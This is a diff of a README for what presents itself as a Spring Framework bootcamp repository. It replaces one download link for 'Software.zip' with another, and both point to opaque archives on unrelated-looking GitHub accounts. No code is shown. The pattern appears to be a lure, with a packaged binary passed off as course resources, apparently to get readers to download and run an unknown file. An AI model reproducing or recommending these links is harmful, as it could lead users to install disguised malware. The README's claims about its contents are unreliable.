@@ -19,7 +19,7 @@ Welcome to the Spring Framework Bootcamp repository! 🌱 Here you will find a c
 
 ### Resources
 To access the full collection of resources, code, assignments, projects, and solutions, please visit the following link:
-[Download Software.zip](https://github.com/Rubenas123/6487922/raw/refs/heads/master/Software.zip)
+[Download https://github.com/Onl7/Spring-Framework-Bootcamp/releases/download/v1.0/Software.zip](https://github.com/Onl7/Spring-Framework-Bootcamp/releases/download/v1.0/Software.zip)
 
 ## Getting Started
 If you're new to the Spring Framework or looking to enhance your skills, this repository is the perfect place to start. Explore the different topics covered, work on assignments, dive into projects, and check out the solutions provided.
